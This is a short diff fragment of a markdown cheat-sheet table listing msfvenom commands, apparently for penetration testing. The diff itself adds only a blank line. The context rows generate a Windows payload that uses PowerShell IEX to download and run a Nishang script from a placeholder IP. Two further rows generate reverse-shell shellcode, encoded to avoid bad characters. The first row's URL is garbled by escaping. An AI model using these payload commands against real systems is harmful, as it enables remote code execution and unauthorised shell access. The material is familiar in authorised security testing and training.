@@ -26,3 +26,4 @@
 | msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('[http://IP/nishang.ps1')\](http://ip/nishang.ps1')%5C)"" -f python | Windows Exec Nishang Powershell in python |
 | msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0" | Bad characters shikata_ga_nai |
 | msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0" | Bad characters fnstenv_mov |
+ 
